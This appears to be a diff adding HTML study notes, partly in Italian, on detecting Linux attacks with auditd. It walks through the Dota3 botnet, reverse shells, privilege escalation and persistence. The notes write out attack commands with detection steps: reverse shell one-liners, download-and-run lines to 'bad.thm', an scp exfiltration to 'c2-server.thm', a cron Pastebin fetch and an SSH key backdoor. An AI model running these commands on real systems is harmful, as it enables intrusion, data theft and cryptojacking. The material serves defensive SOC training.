+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'<br>
+lscpu | grep Model<br>
+# Unclear purpose<br>
+ls -lh $(which ls)<br>
+# Generic Discovery<br>
+crontab -l <br>
+w<br>
+uname -m<br>
+</code>
+<h4>Persistence</h4>
+<p>the first command changes the password of the breached "ubuntu" user to a more complex one (to secure the victim from being breached by competitor botnets!), and the following commands replace all SSH keys with the malicious one (to lock out the system owner from accessing their server). This is all to ensure reliable access to the victim when needed.</p>
+<code>
+`echo -e "ubuntu123\nN2a96PU0mBfS\nN2a96PU0mBfS"|passwd|bash` >> up.txt<br>
+cd ~<br>
+rm -rf .ssh<br>
+mkdir .ssh<br>
+# Note the "mdrfckr" comment, unique to this attack<br>
+echo "ssh-rsa [ssh-key] mdrfckr" >> .ssh/authorized_keys<br>
+chmod -R go= ~/.ssh<br>
+</code>
+<h3>Detecting the Attack</h3>
+<p>Dota3 remains active because many administrators set weak SSH passwords. In a real SOC with SIEM, you would likely receive multiple alerts: SSH login from a known malicious IP, a spike of Discovery commands, and a match for the attack string "mdrfckr". You can also spot the attack manually using the two methods below:
+<br><b>Log Source  + Description</b><br></p>
+<ul>
+    <li><b>Auth Logs:</b> <code> cat /var/log/auth.log | grep "Accepted"</code> - Look for successful SSH logins by password from untrusted, external IP addresses</li>
+    <li><b>Auditd Process Logs:</b> <code>ausearch -i -x [command]</code> -	Look for execution of Discovery commands (e.g. uname, lscpu) and trace their origin</li>
+</ul>
+<code>ausearch -i -if /home/ubuntu/scenario/audit.log     --->esempio log in altra cartella <br>
+cat audit.log | grep "comm" | cut -d' ' -f 12,13,25,26     ---> elenca per ppid, pid, comm, exe (da come ho svolto l'esercizio)<br>
+cat audit.log | cut -d' ' -f 12,13,25,26 | uniq | sort  > filenuovo.txt   ---> elenco nuovo su file .txt (da come ho svolto l'esercizio) <br>
+cat filenuovo.txt | cut -d' ' -f 3,4 | uniq | sort    ----> avremmo cosi la lista dei commandi pulita, ordinata (da come ho svolto l'esercizio) <br>
+last -->This command will display a list of users who have logged in and out of the system, along with their login times and durations.
+</code>
+<h2>Dota3: Miner Setup</h2>
+<p>Continuing the Dota3 infection chain, the threat actors have maintained their presence on the victim and now decide whether to install a cryptominer and supplementary malware. Since they already have SSH access, they simply upload the tools via SCP using the previously changed password. Below is an example of how it works:<br>
+<b>1) How Threat Actors Transfer Malware:</b><br><code>
+user@bot-1672$ scp dota3.tar.gz ubuntu@victim:/tmp<br>
+[OK] Transfered dota3.tar.gz file to the victim<br></code>
+2) After transferring the tools (dota3.tar.gz), the attackers unpack them into a hidden folder under /tmp, a common location for staging temporary malware. Take a look at the commands below and notice how strangely the created directories are named. This is to resemble legitimate software and discourage the IT team from investigating further upon detection.<br>
+<code>
+# Prepare a hidden /tmp/.X26-unix folder for malware<br>
+cd /tmp<br>
+rm -rf .X2*<br>
+mkdir .X26-unix<br>
+cd .X26-unix<br>
+# Unarchive malware to /tmp/.X26-unix/.rsync/c folder<br>
+tar xf dota3.tar.gz<br>
+sleep 3s<br>
+cd /tmp/.X26-unix/.rsync/c<br>
+</code>
+<i> Spiegazione 1: (Il comando rm -rf .X2* elimina ricorsivamente (opzione -r) e forzatamente (opzione -f) tutti i file e le directory che iniziano con .X2 nella directory corrente. Fai attenzione, poiché non ci sarà possibilità di recupero dopo l'esecuzione di questo comando.)
+<br>(Il comando 'sleep' viene utilizzato per mettere in pausa l'esecuzione del processo per un determinato periodo di tempo, in questo caso 3 secondi. Questo può essere utile per garantire che l'estrazione dei file con 'tar' sia completata prima di eseguire il comando successivo 'cd'. In scenari di attacco, questo può aiutare a sincronizzare le operazioni e ridurre la possibilità di errori durante la sequenza di esecuzione dei comandi.)
+<br></i>
+3) Lastly, the threat actors execute two binaries from the archive. The first, tsm, is a customized network scanner that probes the internal network for other systems with exposed SSH services. The second, initall, is an XMRig cryptominer that loads the victim's CPU to generate revenue for the attackers. Pay attention that both binaries are launched with nohup, a command that allows the processes to continue running in the background even after the SSH session is closed.<br>
+<code>
+# Scan the internal network with the "tsm" malware<br>
+nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 192.168 >> /dev/null 2>1&<br>
+sleep 8m<br>
+nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 172.16 >> /dev/null 2>1&<br>
+sleep 20m<br>
+# Run the actual cryptominer named "initall"<br>
+cd ..; nohup /tmp/.X26-unix/.rsync/initall 2>1&<br>
+# That's it, Dota3 attack is now completed!<br>
+exit 0<br>
+</code>
+<i>Spiegazione 2: ( La prima parte scansiona la rete interna utilizzando il malware 'tsm', mirato a sistemi con servizio SSH su specifici intervalli IP (192.168 e 172.16). Il comando 'nohup' consente a queste scansioni di essere eseguite in background senza interruzione, anche se la sessione viene chiusa. I comandi 'sleep' introducono ritardi tra le scansioni, probabilmente per evitare il rilevamento o consentire il completamento della prima scansione prima di avviare la seconda. Infine, il comando 'initall' esegue il vero e proprio cryptominer, che sfrutta la CPU della vittima per il mining di criptovalute. Questa sequenza illustra un metodo per mantenere la persistenza e ampliare la superficie d'attacco.)<br>
+( Il comando nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 192.168 >> /dev/null 2>1& esegue il seguente processo:<br>
+nohup permette al comando di continuare a girare in background anche dopo la chiusura della sessione SSH.<br>
+/tmp/.X26-unix/.rsync/c/tsm è il percorso del file eseguibile del malware, 'tsm', che è un scanner di rete personalizzato.<br>
+-p 22 specifica la porta da scansionare, in questo caso la porta SSH (22).<br>
+[...] rappresenta ulteriori parametri che potrebbero essere utilizzati dal malware, che non sono specificati.<br>
+/tmp/up.txt è il file in cui verranno salvati i risultati della scansione.<br>
+192.168 è l'intervallo di indirizzi IP da scansionare, mirato a trovare altri sistemi con servizi SSH esposti.<br>
+>> /dev/null redirige l'output standard al dispositivo null, ignorando qualsiasi output normale.<br>
+2>1 redirige l'output di errore all'output standard, quindi anche gli errori saranno ignorati.<br>
+& esegue il comando in background, liberando il terminale per ulteriori operazioni.<br>
+ )<br>
+(tsm è un programma inventato/creato dall'attaccante) </i>
+</p>
+<h3>Detecting the attack</h3>
+<p>Here, the common indicators your SOC rules or EDR alerts would react upon are:<br></p>
+<ul>
+    <li>Auditd logs: Creation of untrusted, hidden files and folders in the /tmp directory</li>
+    <li>Auditd logs: Creation of files named like known malware, such as dota3.tar.gz</li>
+    <li>Auditd logs: Usage of commands often observed in attacks, such as nohup</li>
+    <li>Network traffic: SSH port scan of the whole 192.168.* and 172.16.* networks</li>
+    <li>EDR solution: The XMrig cryptominer binary is blocked by most EDRs (VirusTotal Example)</li>
+</ul>
+<p>Esempio Esercizio:<br>
+1)cat auth.log | grep sshd | grep Accepted -> cat auth.log | grep "45.9.148.125"  -> cat auth.log | grep "2025-09-11"<br>
+2)cat audit.log | cut -d' ' -f 12,13,25,26 | uniq | sort  > filenuovo.txt  -> cat filenuovo.txt | cut -d' ' -f 3,4 | uniq | sort   <br>
+Dalla Lista mi annoto quali comandi potrebbero essere sospetti e analizzo i processi.<br>
+3)ausearch -if audit.log | grep "NOME COMANDO"<br>
+<code>comm="gzip" exe="/usr/bin/gzip"<br>
+	pid 5499 kernupd.tar.gz    comm="tar" exe="/usr/bin/tar"    a4="/tmp/.apt"<br>
+	pid 5393   time->Thu Sep 11 21:13:33 2025    hostname=45.9.148.125<br>
+	pid 5339  proctitle=2F7573722F7362696E2F73736864002D44002D52<br>
+</code><br>
+<code>cat audit.log | grep kernup<br>
+type=EXECVE msg=audit(1757625295.515:2254): argc=5 a0="tar" a1="xzf" a2="kernupd.tar.gz" a3="-C" a4="/tmp/.apt"   <--Leggi command! a0,a1 ...<br>
+type=EXECVE msg=audit(1757625363.850:2331): argc=3 a0="chmod" a1="+x" a2="/tmp/.apt/kernupd/kernupd"            <--Leggi command!<br>
+type=EXECVE msg=audit(1757625368.666:2337): argc=2 a0="nohup" a1="/tmp/.apt/kernupd/kernupd"		  <--Leggi command!<br>
+</code><br>
+<i>Spiegazione: (tar xzf archivio.tar.gz    => x → extract (estrai)  z → usa gzip (.gz) f → file (il nome dell’archivio segue subito) = estrae un archivio tar compresso con gzip)</i><br>
+4) Poi dopo aver individuato il processo attivo con ps aux | grep kern<br>
+<code> ps -p 1743 -o user,pid,ppid,%cpu,etime,cmd </code><br><br>
+<code>grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})" audit.log | sort -u  <- Comando Spiegato bene per elencare tutti gli IP<br>
+Opzioni di grep<br>
+-E → usa regex estese (ERE, Extended Regular Expressions)<br>
+-o → stampa solo la parte che combacia, non tutta la riga<br>
+Senza -o, vedresti l’intera riga che contiene l’IP.<br>
+<br>
+La regex spiegata<br>
+[0-9]{1,3}<br>
+[0-9] → una cifra da 0 a 9   {1,3} → ripetuta da 1 a 3 volte<br>
+→ numeri da 0 a 999<br>
+ \.    --> Il punto . in regex significa “qualsiasi carattere”<br>
+\.   --> lo escapa per indicare un punto letterale<br>
+</code>
+</p>
+<a href="#inizio"  class="button-link">Torna all'indice!</a>
+<hr>
+<h2 id="revshell">Reverse Shells</h2>
+<p><b>Attack Convenience: Threat actors entering via SSH get a convenient terminal with colors, autocompletion, and Ctrl+C support. However, not every breach grants a fully functional terminal. When Initial Access happens via an exploit or a web vulnerability, the attackers may face limitations: Buggy command output, execution delays and timeouts, rate limits, network restrictions, and many more.<br>
+(esempio:<br>  1) Need to pretend "127.0.0.1 && " to the commands<br>   2) Commands are executed after a delay(after ping)<br>   3) can't use Ctr+C or see command history and errors    )</b></p>
+<p><b>Rerverse Shells: </b> a session from the victim to the attacker, a more convenient and often the only possible action to continue the attack.
+<br>Below are three of the many methods to open a reverse shell on Linux: <br> <b>Command on the Victim  + Explanation</b></p><br>
+<ul>
+    <li><code>bash -i >& /dev/tcp/10.10.10.10/1337 0>&1	</code>	The victim is forced to connect to 10.10.10.10:1337 and launch "bash" for the attacker.</li>
+    <li><code>socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane	</code>	Socat alternative to the above command. The attacker is listening at 10.20.20.20:2525.</li>
+    <li><code>python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'</code>	Python alternative to the above command. The attacker is listening at 10.30.30.30:80.</li>
+</ul>
+<h3>Detecting Reverse Shells - They are detectable with auditd</h3>
+<h4>Finding Reverse Shell Origin:</h4>
+<code>root@thm-vm:~$ ausearch -i -x socat # Look for suspicious commands like socat<br>
+type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]<br>
+type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec<br>
+<br>
+root@thm-vm:~$ ausearch -i --pid 27806 # Find its parent process and build a process tree<br>
+type=PROCTITLE msg=audit(09/19/25 17:42:07.825:404) : proctitle=/bin/sh -c 4 -W 1 127.0.0.1 && socat TCP:10.20.20.20:2525 EXEC:'bash',[...]<br>
+type=SYSCALL msg=audit(09/19/25 17:42:07.825:404) : ppid=27796 pid=27806 auid=unset uid=serviceuser key=exec<br>
+<br>
+root@thm-vm:~$ ausearch -i --pid 27796 # Move up the process tree to confirm its origin - TryPingMe<br>
+type=PROCTITLE msg=audit(09/19/25 17:41:57.252:403) : proctitle=/usr/bin/python3 /opt/trypingme/main.py<br>
+type=SYSCALL msg=audit(09/19/25 17:41:57.252:403) : exe=/usr/bin/python3.12 ppid=1 pid=27796 auid=unset uid=serviceuser key=exec<br>
+</code>
+<p>After the reverse shell to the attacker's IP is established, it is usually followed by Discovery. As always, you can list all commands originating from the spawned reverse shell by building a process tree:</p>
+<h4>2)  Listing Reverse Shell Activity</h4>
+<code>
+root@thm-vm:~$ ausearch -i -x socat # Start from the detected reverse shell<br>
+type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]<br>
+type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec<br>
+<br>
+root@thm-vm:~$ ausearch -i --ppid 27808 | grep proctitle # List all its child processes<br>
+type=PROCTITLE msg=audit(09/19/25 17:42:12.825:408) : proctitle=id<br>
+type=PROCTITLE msg=audit(09/19/25 17:42:14.371:410) : proctitle=uname -a<br>
+type=PROCTITLE msg=audit(09/19/25 17:42:25.432:412) : proctitle=ls -la .<br>
+[...]<br>
+</code>
+<br><a href="#inizio"  class="button-link">Torna all'indice!</a><br>
+<h2 id="privesca">Privilege Escalation</h2>
+<p>Another obstacle for attackers is insufficient privileges. Initial Access doesn't always mean a full system compromise, and web attacks and exploits often start as low-privilege service users. These users can sometimes be restricted to a single folder (e.g. /var/www/html) or have no ability to download and run malware. In this case, the attackers need Privilege Escalation, which can be achieved through various techniques. For example, to get to the root user, the threat actors may:<br><b>Preceding Discovery (IF) + Privilege Escalation (THEN)</b></p>
+<ul>
+    <li>The uname -a shows an old, unpatched Ubuntu 16.04	-> <b>Run an exploit like PwnKit:</b> <code>wget http://bad.thm/pwnkit.sh | bash</code></li>
+    <li>The find /bin -perm 4000 detects an env binary with the SUID flag  -> <b>Use the SUID vulnerability to get root access:</b><code> /bin/env /bin/bash -p</code></li>
+    <li>The ls /etc/ssh exposed an unprotected ssh-backup-key file	-> <b>Try using the file to get root access:</b> <code>ssh root@127.0.0.1 -i ssh-backup-key</code></li>
+</ul>
+<h3>Detecting Privilege Escalation</h3>
+<p>Detecting Privilege Escalation might be tricky because of how different it can be: There are hundreds of SUID misconfigurations and thousands of software vulnerabilities, each exploitable in its own unique way. Thus, a more universal approach would be to detect the surrounding events. For example, review the attack below which has just three steps: Discovery, Privilege Escalation, and Exfiltration after the "root" access is gained.</p>
+<code>    <br>
+# Detection 1: A Spike of Discovery Commands<br>
+whoami                                                # Returns "www-data" user<br>
+id; pwd; ls -la; crontab -l                           # Basic initial Discovery<br>
+ps aux | egrep "edr|splunk|elastic"                   # Security tools Discovery<br>
+uname -r                                              # Returns an old 4.4 kernel<br>
+<br>
+# Detection 2: A Download to Temp Directory<br>
+wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download<br>
+gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation<br>
+chmod +x /tmp/pwnkit                                  # Making exploit executable<br>
+/tmp/pwnkit                                           # Trying to use the exploit<br>
+<br>
+# Detection 3: Data Exfiltration With SCP<br>
+whoami                                                # Now returns "root" user<br>
+tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data<br>
+scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data<br>
+<br>
+</code>
+<p>Even if you don't know the exact mechanics of the PwnKit exploit, you can still detect anomalies using more common attack indicators. After spotting suspicious activity, you can confirm whether privilege escalation succeeded by comparing the effective user before and after the exploit. If the users differ, the attacker gained elevated privileges, like in the example below:
+<br><b>Looking for Reverse Shell Activity</b><br></p>
+<code>    
+root@thm-vm:~$ ausearch -i -x pwnkit # The PwnKit was launched by serviceuser (Look at the UID field)<br>
+type=PROCTITLE msg=audit(09/19/25 17:56:12.154:416) : proctitle=/tmp/pwnkit<br>
+type=SYSCALL msg=audit(09/19/25 17:56:12.154:416) : ppid=24302 pid=24304 auid=unset uid=serviceuser key=exec<br>
+<br>
+root@thm-vm:~$ ausearch -i --ppid 24304 # The PwnKit spawned a root shell (Look at the UID field)<br>
+type=PROCTITLE msg=audit(09/19/25 17:56:12.807:418) : proctitle=bash<br>
+type=SYSCALL msg=audit(09/19/25 17:56:12.807:418) : ppid=24304 pid=24310 auid=unset uid=root key=exec<br>
+<br>
+root@thm-vm:~$ ausearch -i --ppid 24310 # The threat actor continues the attack as root user<br>
+type=PROCTITLE msg=audit(09/19/25 17:56:15.225:424) : proctitle=whoami<br>
+type=SYSCALL msg=audit(09/19/25 17:56:15.225:424) : ppid=24310 pid=24312 auid=unset uid=root key=exec<br>
+</code><br>
+<p>Esempio/Esercizio: <br> <code>grep -iR pass </code>    ----> Il comando 'grep -iR pass' cerca ricorsivamente (-R) il termine 'pass', ignorando la distinzione tra maiuscole e minuscole (-i), all'interno dei file e delle directory nella posizione attuale. È utile per trovare occorrenze di una parola chiave in tutti i file di una directory e nelle sue sottodirectory.   <br>
+<code>cat /home/ubuntu/scenario/audit.log | grep "argc=" | cut -d' ' -f3,4,5,6,7,8,9 | sort >> nuovofile.txt    </code>  --> estrae dal log tutti i commandi digitati
+<br>
+<code>argc=2 a0="su" a1="root"</code> ---> cmd used to escalate privileges to root<br>
+<i>Looking at the detected .env file, what was the root password?</i> <code>argc=2 a0="cat" a1=".env.local"</code><br>
+argc=2 a0="cat" a1=".env.local"   (dalla cartella corrente)<br>
+<code>sudo find / -name ".env.local" 2>/dev/null</code>  (in tutto il sistema)<br>
+<code>sudo find / -name ".env.local"</code> -> risultato /opt/trypingme/.env.local  <br>
+<code>cat /opt/trypingme/.env.local</code><br>
+</p>
+<br><a href="#inizio"  class="button-link">Torna all'indice!</a><br>
+<h2 id="startup">Startup Persistence</h2>
+<p><b>Persistence in  Linux-  the most common ones:</b></p>
+<h3>Cron Persistence</h3>
+<p>Cron jobs are like scheduled tasks in Windows - they are the simplest way to run a process on schedule and the most popular persistence method. For example, as a part of a big espionage campaign, APT29 deployed a fully-functional malware named GoldMax (CrowdStrike blogpost). To ensure the malware survives a reboot, they added a new line to the victim's cron job file, located at <code>/var/spool/cron/< user ></code>.
+</p>
+<code>    
+# A line added by APT29 to /var/spool/cron/<user> to run malware on boot<br>
+@reboot nohup /home/< user >/.< hidden-directory >/< malware-name > > /dev/null 2>&1 &<br>
+</code>
+<p>Another example is Rocke cryptominer. After exploiting vulnerabilities in public-facing services like Redis or phpMyAdmin, Rocke downloads the cryptomining script from Pastebin and installs it as a /etc/cron.d/root cron job (Red Canary blogpost). Note the */10 part, which means the script will be redownloaded every 10 minutes, likely to quickly restore its files in case the IT team accidentally deletes them.</p>
+<code>
+    # A simplified command that adds the cron job to /etc/cron.d/root<br>
+echo "*/10 * * * root (curl https://pastebin.com/raw/1NtRkBc3) | sh" > /etc/cron.d/root<br>
+</code>
+<h3>Systemd Persistence</h3>
+<p>Systemd services host the most critical system components. Nowadays, DNS, SSH, and nearly every web service are organized as separate .service files located at <code>/lib/systemd/system or /etc/systemd/system folders</code>. With "root" privileges, you can make your own services, as can the threat actors. For example, the Sandworm group once created a "cloud-online" service to enable its GOGETTER malware to run on reboot (Mandiant report).
+</p>
+<code>
+    
+# A simplified content of /lib/systemd/system/cloud-online.service file<br>
+[Unit]<br>
+Description=Initial cloud-online job    # Fake description to mimic a trusted service<br>
+[Service]<br>
+ExecStart=/usr/bin/cloud-online         # GOGETTER malware disguisted as a trusted file<br>
+</code>
+<h3>Detecting Persistence</h3>
+<p>Let's focus on detecting the moment attackers establish Persistence. Both cron jobs and systemd services are defined as simple text files, which means you can monitor them for changes using auditd. In addition, Persistence can be detected by tracking the creation of related processes, specifically crontab for managing cron jobs and systemctl for managing services:<br></p>
+<ul>
+    <li>Monitor changes in cron job files	<code>/etc/crontab, /etc/cron.d*, /var/spool/cron/*, /var/spool/crontab/*</code></li>
+    <li>Monitor changes in systemd folders	<code>/lib/systemd/system/*, /etc/systemd/system/*, and less common locations</code></li>
+    <li>Monitor related processes such as	<code>nano /etc/crontab, crontab -e, systemctl start|enable < service ></code></li>
+</ul>
+<p>Detecting Persistence With Auditd:</p>
+<code>root@thm-vm:~$ ausearch -i -f /etc/systemd # Look for file changes inside /etc/systemd<br>
+type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=vi /etc/systemd/system/malicious.service<br>
+type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/etc/systemd/system/malicious.service<br>
+type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/<br>
+type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd<br>
+<br>
+root@thm-vm:~$ ausearch -i -x crontab # Look for execution of crontab command<br>
+type=PROCTITLE msg=audit(09/22/25 17:25:14.933:807) : proctitle=crontab -e<br>
+type=SYSCALL msg=audit(09/22/25 17:25:14.933:807) : syscall=execve [...] ppid=1265 pid=1316 uid=root key=exec<br>
+</code>
+<p>Esempio/Esercizio:<br>
+<code>ausearch -i -x crontab</code>  -> <code>/var/spool/cron/crontabs$ ls</code> -> <code>ausearch -i -f /etc/systemd</code>
+<code>grep -a "THM" /var/lib/misc/tux </code> -> cerca THM all'interno di una libreria <br>
+</p>
+<br><a href="#inizio"  class="button-link">Torna all'indice!</a><br>
+<h2 id="account">Account Persistence</h2>
+<p>As an attacker, you might want to return to the victim in a month to steal more data, but don't leave any malware there. How can you maintain access without malware? It all depends on how you entered in the first place.</p>
+<h3>New User Account</h3>
+<p>If SSH is exposed, the attackers may create a new user account, add it to a privileged group, and then use it for further SSH logins. The detection is simple, too, as you can track the user creation events through authentication logs and then reconstruct the full process tree with auditd (by starting with ausearch -i --ppid 27254 for the example below): <br><b>Detecting New User Account:</b><br></p>
+<code>root@thm-vm:~$ cat /var/log/auth.log | grep -E 'useradd|usermod'<br>
+2025-09-18T15:46:30 thm-vm useradd[27254]: new group: name=support, GID=1001<br>
+2025-09-18T15:46:30 thm-vm useradd[27254]: new user: name=support, UID=1001, GID=1001, home=/home/support, shell=/bin/bash<br>
+2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to group 'sudo'<br>
+2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to shadow group 'sudo'<br>
+</code>
+<h3>Backdoored SSH Keys</h3>
+<p>Another account persistence method is to backdoor the SSH keys of one of the users and use them for future logins instead of a password. (Dota3 malware added its key to the breached user)
+This technique is difficult for IT to spot as malicious keys can blend in with legitimate ones. For example:<br>
+<b>Adding SSH Backdoor</b><br>
+</p>
+<code>
+    # Adding SSH backdoor to the authorized_keys<br>
+root@thm-vm:~$ echo "AAAAC3Nza...IkiINvQt/R" >> ~/.ssh/authorized_keys<br>
+<br>
+# It's hard to guess which key is a backdoor!<br>
+root@thm-vm:~$ cat ~/.ssh/authorized_keys<br>
+ssh-ed25519 AAAAC3Nza...oh5fpNy1Gi # Legitimate key<br>
+ssh-ed25519 AAAAC3Nza...N9a2UYsFpQ # Legitimate key<br>
+ssh-ed25519 AAAAC3Nza...IkiINvQt/R # Backdoor key<br>
+</code>
+<p>By default, authorized SSH public keys are stored in each user's ~/.ssh/authorized_keys file, so your best detection method is to monitor changes to these files using auditd. Note that relying on process creation events is ineffective, since there are numerous ways to modify SSH keys, some of which aren't properly traced with auditd. For example, echo [key] >> ~/.ssh/authorized_keys will not be logged, as echo is a shell builtin:<br>
+<b>Detecting SSH Backdoor:</b><br></p>
+<code># Traces of a backdoor created with "echo [key] >> ~/.ssh/authorized_keys"<br>
+# Note how the malicious "echo" command is logged simply as "bash"<br>
+root@thm-vm:~$ ausearch -i -f /.ssh/authorized_keys<br>
+type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=bash<br>
+type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/home/user/.ssh/authorized_keys<br>
+type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/<br>
+type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd<br>
+</code>
+<h3>Application Persistence</h3>
+<p>Imagine a WordPress website where the web admin account has been breached. With admin privileges, the attackers can add a backdoor (e.g. a WSO web shell) to the website and run commands through the backdoor - no cron jobs or SSH keys required! Moreover, because the persistence lives in the application layer, auditd and system logs often never see it.
+you should be aware that it's a possible and common scenario. If you verified all possible persistence techniques, but malware somehow reappears after some time, one of your public-facing apps might be compromised!</p>
+<br><a href="#inizio"  class="button-link">Torna all'indice!</a><br>
+
+
+<h2>Targeted Attacks</h2> 
+<p>There can be more complex and more devastating attacks that target specific companies or governments. That's where you would need the learned techniques the most!<br>
+<b>1)Linux as Entry Point:</b> <br>
+Linux machines are commonly deployed as firewalls, web servers, mail servers, or other public-facing services. Even in organizations where 99% of the infrastructure is Windows-based, a single compromised Linux server can open the door to a corporate network and result in a big Impact. That's why, as a SOC analyst, you need to know how to secure all popular operating systems!<br>
+<b>2)Linux in Espionage</b><br>
+Linux machines can store sensitive information or be used in mission-critical networks and thus are often targeted by state-sponsored threat groups. For example, in this espionage campaign (Symantec article), Kimsuky APT installed a backdoor on multiple important Linux targets. Interestingly, they used systemd service persistence <br>
+<b>3)Linux in Ransomware</b><br>
+Linux ransomware is on the rise, with hypervisors becoming a prime target. Imagine the case: Your company runs hundreds of Windows VMs, all sitting on just three Linux physical servers (hypervisors). If those hypervisors aren't properly secured, all corporate VMs are at risk.</p>   <br>
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr> 
+</div>
+
+</body>
+</html>
